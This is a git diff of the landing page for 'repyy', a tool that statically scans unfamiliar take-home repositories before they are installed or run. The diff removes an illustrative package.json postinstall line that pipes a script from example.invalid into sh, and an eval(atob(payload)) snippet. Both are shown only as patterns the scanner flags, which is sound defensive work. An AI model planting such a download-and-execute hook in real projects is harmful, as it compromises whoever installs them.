@@ -2,7 +2,13 @@
 import BaseLayout from "../layouts/BaseLayout.astro";
 import SiteFooter from "../components/SiteFooter.astro";
 import SiteHeader from "../components/SiteHeader.astro";
+import WorkflowAnatomy from "../components/WorkflowAnatomy.astro";
+import RiskMeters from "../components/RiskMeters.astro";
+import EncodingReader from "../components/EncodingReader.astro";
+import BentoAnatomy from "../components/BentoAnatomy.astro";
 import "../styles/landing.css";
+import "../styles/bento-anatomy.css";
+import "../styles/experience.css";
 
 const title = "repyy | A closer look before you run";
 const description =
@@ -16,7 +22,7 @@ const description =
       <div class="hero-copy">
         <p class="context-line">Repository preflight. Free and open source.</p>
         <h1>
-          Inspect the assignment.<span>Before you execute it.</span>
+          A closer look.<span>Before you run.</span>
         </h1>
         <p class="hero-lede">Repyy reviews unfamiliar take-home repositories before you install dependencies, start the project, or open it in your IDE.</p>
         <div class="hero-actions">
@@ -29,99 +35,34 @@ const description =
         </div>
         <p class="hero-limitation">Static analysis can identify risks, but it cannot prove that a repository is safe.</p>
       </div>
-
-      <ol class="execution-moments" aria-label="When to inspect the assignment">
-        <li>
-          <span>Before you install</span>
-          <code>npm install</code>
-        </li>
-        <li>
-          <span>Before you start</span>
-          <code>npm run dev</code>
-        </li>
-        <li>
-          <span>Before you open</span>
-          <code>Your IDE workspace</code>
-        </li>
-      </ol>
     </section>
     <section class="workflow" id="workflow">
-      <div class="workflow-intro reveal">
+      <div class="workflow-intro">
         <div class="section-head">
           <p class="section-label">How it works</p>
-          <h2>
-            Read first.
-            <br />
-            Then decide.
-          </h2>
+          <h2>Files in. Evidence out.</h2>
           <p>Start with a local folder or Git URL. Keep assignment-controlled commands unexecuted while you review.</p>
         </div>
-        <ol class="inspection-steps">
-          <li>
-            <span aria-hidden="true">01</span>
-            <div>
-              <h3>Read the repository as data.</h3>
-              <p>During a normal scan, Repyy reads files, scripts, dependencies, and configuration as data without intentionally running assignment code.</p>
-            </div>
-          </li>
-          <li>
-            <span aria-hidden="true">02</span>
-            <div>
-              <h3>Review the evidence.</h3>
-              <p>See source locations, why a pattern may matter, and where coverage is incomplete.</p>
-            </div>
-          </li>
-          <li>
-            <span aria-hidden="true">03</span>
-            <div>
-              <h3>Choose your next step.</h3>
-              <p>Inspect the source, ask the sender for context, use stronger isolation, or stop.</p>
-            </div>
-          </li>
-        </ol>
+        <WorkflowAnatomy />
       </div>
-      <figure class="source-study reveal">
-        <figcaption>
-          <span>Small file. Significant behavior.</span>
-          <span>Illustrative source excerpt</span>
-        </figcaption>
-        <div class="source-study-body">
-          <div class="source-excerpt">
-            <p class="file-label">
-              package.json <span>Install behavior</span>
-            </p>
-            <pre aria-label="Example package script that downloads and executes a remote file"><code><span class="source-line"><i>10</i>  "scripts": &#123;</span><span class="source-line"><i>11</i>    "test": "vitest",</span><span class="source-line flagged"><i>12</i>    "postinstall":</span><span class="source-line flagged"><i>13</i>      "curl -fsSL https://example.invalid/setup.sh | sh"</span><span class="source-line"><i>14</i>  &#125;</span></code></pre>
-          </div>
-          <div class="source-note">
-            <span class="finding-label">Download → execute</span>
-            <h2>
-              Before the app starts, <br />a script can run.
-            </h2>
-            <p>Repyy reads install paths as data and surfaces behavior for review. A normal scan does not intentionally execute assignment code.</p>
-          </div>
-        </div>
-        <div class="source-study-footer">
-          <code>
-            <span>$</span> repyy scan URL
-          </code>
-          <span>No installs. No builds. No target execution.</span>
-        </div>
-      </figure>
     </section>
     <section class="coverage" id="coverage">
-      <div class="section-head reveal">
-        <p class="section-label">What the scan checks</p>
-        <h2>Look beyond the source files.</h2>
+      <div class="section-head coverage-heading">
+        <div>
+          <p class="section-label">What the scan checks</p>
+          <h2>Look beyond the source files.</h2>
+        </div>
         <p>Static checks look for patterns across install paths, automation, encoded payloads, credentials, metadata, and archives.</p>
       </div>
 
       <div class="coverage-grid">
-        <article class="coverage-card coverage-primary reveal">
+        <article class="coverage-card coverage-primary">
           <div class="card-meta">
-            <span>Repository inspection</span>
+            <span>01 / Execution paths</span>
             <strong>Install paths</strong>
           </div>
-          <p>Illustrative scan coverage</p>
+          <p class="scan-caption">A closer look at the paths that can execute.</p>
+          <BentoAnatomy kind="install" />
           <div class="coverage-probe">
             <span>
               <b>package.json</b>
@@ -147,103 +88,85 @@ const description =
           <p>Lifecycle scripts, custom registries, unexpected binaries, and download-to-execute chains are evaluated together.</p>
         </article>
 
-        <article class="coverage-card coverage-confidence reveal">
+        <article class="coverage-card coverage-confidence">
           <div class="card-meta">
-            <span>Finding model</span>
+            <span>02 / Finding model</span>
             <strong>Severity ≠ confidence</strong>
           </div>
-          <div class="confidence-stack" aria-label="Example finding: high severity and medium confidence">
-            <div>
-              <span>Severity</span>
-              <strong>High</strong>
-            </div>
-            <div>
-              <span>Confidence</span>
-              <strong>Medium</strong>
-            </div>
-          </div>
+          <RiskMeters />
           <p>Severity and confidence remain separate so review signals are not presented as proof of compromise.</p>
         </article>
 
-        <article class="coverage-card coverage-signal reveal">
+        <article class="coverage-card coverage-signal">
           <div class="card-meta">
-            <span>Encoded behavior</span>
-            <strong>Obfuscation</strong>
+            <span>03 / Encoded behavior</span>
+            <strong>
+              Hidden code.
+              <br />
+              Visible intent.
+            </strong>
           </div>
-          <div class="signal-code" aria-hidden="true">
-            <code>eval(atob(payload))</code>
-            <span>high entropy</span>
-            <span>invisible chars</span>
-          </div>
-          <p>Encoded payloads, dynamic execution, entropy, string shufflers, and invisible characters.</p>
+          <EncodingReader />
+          <p>Code can hide what it does behind encoded text. Repyy flags decoding and execution patterns for you to inspect.</p>
         </article>
 
-        <article class="coverage-card coverage-secrets reveal">
-          <div class="card-meta">
-            <span>Redacted evidence</span>
-            <strong>Credentials</strong>
+        <article class="coverage-card coverage-secrets">
+          <div class="credentials-copy">
+            <div class="card-meta">
+              <span>04 / Redacted evidence</span>
+              <strong>Credentials</strong>
+            </div>
+            <div class="redaction" aria-hidden="true">
+              <span>ghp_</span>
+              <i></i>
+              <i></i>
+              <i></i>
+            </div>
+            <p>Recognized credential-shaped values are redacted. Review reports for sensitive content before sharing.</p>
           </div>
-          <div class="redaction" aria-hidden="true">
-            <span>ghp_</span>
-            <i></i>
-            <i></i>
-            <i></i>
-          </div>
-          <p>Recognized credential-shaped values are redacted. Review reports for sensitive content before sharing.</p>
+          <BentoAnatomy kind="secrets" />
         </article>
 
-        <article class="coverage-card coverage-surface reveal">
+        <article class="coverage-card coverage-surface">
           <div class="surface-copy">
             <div class="card-meta">
-              <span>Repository surfaces</span>
+              <span>05 / Repository surfaces</span>
               <strong>Beyond the app folder</strong>
             </div>
             <p>CI, editor tasks, agent instructions, containers, Git hooks, archives, and social-engineering signals remain in scope.</p>
           </div>
-          <div class="surface-wheel" aria-hidden="true">
-            <span>CI</span>
-            <span>IDE</span>
-            <span>Git</span>
-            <span>Agent</span>
-            <span>Archive</span>
-            <i>repo</i>
-          </div>
+          <BentoAnatomy kind="surface" />
         </article>
       </div>
     </section>
     <section class="limits">
-      <div class="section-head limits-heading reveal">
-        <p class="section-label">Coverage limits</p>
-        <h2>
-          A clear limit.
-          <br />
-          An honest result.
-        </h2>
+      <div class="limits-heading">
+        <h2>Coverage limits</h2>
         <p>Every scan has a boundary. If a timeout, limit, or read error reduces coverage, repyy reports the scan as incomplete.</p>
       </div>
       <div class="limit-grid">
-        <div class="limit reveal">
+        <div class="limit">
           <strong>10 min</strong>
           <span>Default timeout</span>
         </div>
-        <div class="limit reveal">
+        <div class="limit">
           <strong>100,000</strong>
           <span>Default file limit</span>
         </div>
-        <div class="limit reveal">
+        <div class="limit">
           <strong>50 MiB</strong>
           <span>Default per file</span>
         </div>
-        <div class="limit reveal">
+        <div class="limit">
           <strong>3 levels</strong>
           <span>Archive depth</span>
         </div>
       </div>
-      <p class="limits-note reveal">These defaults are adjustable. They are not detection guarantees.</p>
+      <p class="limits-note">These defaults are adjustable. They are not detection guarantees.</p>
     </section>
 
     <section class="trust-evidence" id="trust" aria-labelledby="trust-title">
-      <div class="trust-intro section-head reveal">
+      <div class="trust-intro section-head">
         <p class="section-label">Trust, with evidence</p>
         <h2 id="trust-title">
           A clear boundary.
@@ -258,7 +181,7 @@ const description =
           Read Trust and Limitations ↗
         </a>
       </div>
-      <div class="evidence-register reveal">
+      <div class="evidence-register">
         <a href="./verification/">
           <span class="evidence-number" aria-hidden="true">
             01
@@ -301,33 +224,30 @@ const description =
       </div>
     </section>
     <section class="reports" id="outputs">
-      <div class="section-head section-head-row reveal">
-        <div>
-          <p class="section-label">Report formats</p>
-          <h2>
-            The same evidence.
-            <br />A view that fits.
-          </h2>
-        </div>
-        <p>
-          Read it in your terminal, pass it to automation, or keep an offline report. Recognized sensitive values are redacted. Review the report before
-          sharing.
-        </p>
-      </div>
-      <div class="report-lab reveal" data-report-lab>
-        <div class="report-tabs" role="tablist" aria-label="Report formats">
-          <button class="is-active" type="button" role="tab" aria-selected="true" data-report-format="terminal">
-            Terminal
-          </button>
-          <button type="button" role="tab" aria-selected="false" data-report-format="json">
-            JSON
-          </button>
-          <button type="button" role="tab" aria-selected="false" data-report-format="sarif">
-            SARIF
-          </button>
-          <button type="button" role="tab" aria-selected="false" data-report-format="html">
-            HTML
-          </button>
+      <div class="report-lab" data-report-lab>
+        <div class="report-heading">
+          <div>
+            <p class="section-label">Report formats</p>
+            <h2>The same evidence. A view that fits.</h2>
+            <p>
+              Read it in your terminal, pass it to automation, or keep an offline report. Recognized sensitive values are redacted. Review the report before
+              sharing.
+            </p>
+          </div>
+          <div class="report-tabs" role="tablist" aria-label="Report formats">
+            <button class="is-active" type="button" role="tab" aria-selected="true" data-report-format="terminal">
+              Terminal
+            </button>
+            <button type="button" role="tab" aria-selected="false" data-report-format="json">
+              JSON
+            </button>
+            <button type="button" role="tab" aria-selected="false" data-report-format="sarif">
+              SARIF
+            </button>
+            <button type="button" role="tab" aria-selected="false" data-report-format="html">
+              HTML
+            </button>
+          </div>
         </div>
         <div class="report-screen">
           <div class="report-screen-bar">
@@ -341,7 +261,7 @@ const description =
               Copy command
             </button>
           </div>
-          <pre aria-live="polite"><code data-report-preview><span class="code-muted">$</span> repyy scan ./assignment
+          <pre><code data-report-preview><span class="code-muted">$</span> repyy scan ./assignment
 
 <b>REVIEW REQUIRED</b>
 2 findings need context
@@ -362,7 +282,7 @@ MED   OBFS-003   src/setup.js:48</code></pre>
         </aside>
       </div>
 
-      <div class="sample-invitation reveal">
+      <div class="sample-invitation">
         <div>
           <p class="section-label">See it before installing</p>
           <h3>See the report before you install.</h3>
@@ -373,17 +293,16 @@ MED   OBFS-003   src/setup.js:48</code></pre>
         </a>
       </div>
       <p class="report-limitation">
-        No relevant findings does not prove safety.
-        <a href="./trust/#incomplete-scans-and-exit-codes">Understand statuses and incomplete coverage ↗</a>
+        No relevant findings does not prove safety. <a href="./trust/#incomplete-scans-and-exit-codes">Understand statuses and incomplete coverage ↗</a>
       </p>
     </section>
     <section class="install" id="install">
-      <div class="section-head reveal">
+      <div class="section-head">
         <p class="section-label">Get started</p>
         <h2>Start with a scan.</h2>
         <p>Install repyy. Scan the assignment. Review what comes back.</p>
       </div>
-      <div class="install-panel reveal" data-install-tabs>
+      <div class="install-panel" data-install-tabs>
         <div class="install-tabs" role="tablist" aria-label="Installation methods">
           <button class="is-active" type="button" role="tab" aria-selected="true" data-install-command="brew install --cask Kevin-Umali/tap/repyy">
             Homebrew
@@ -401,17 +320,20 @@ MED   OBFS-003   src/setup.js:48</code></pre>
           </code>
           <button class="install-copy-button" data-install-copy type="button">
             <span data-copy-label>Copy command</span>
-            <i aria-hidden="true">↗</i>
+            <i class="copy-icon" aria-hidden="true">
+              <span class="copy-icon-default">↗</span>
+              <span class="copy-icon-success">✓</span>
+            </i>
           </button>
         </div>
       </div>
 
-      <div class="install-links reveal">
+      <div class="install-links">
         <a href="./installation/">Installation guide ↗</a>
         <a href="./verification/">Verify your download ↗</a>
       </div>
     </section>
-    <section class="faq reveal" aria-labelledby="questions-title">
+    <section class="faq" aria-labelledby="questions-title">
       <h2 id="questions-title">Before you begin.</h2>
       <div class="faq-list">
         <details>
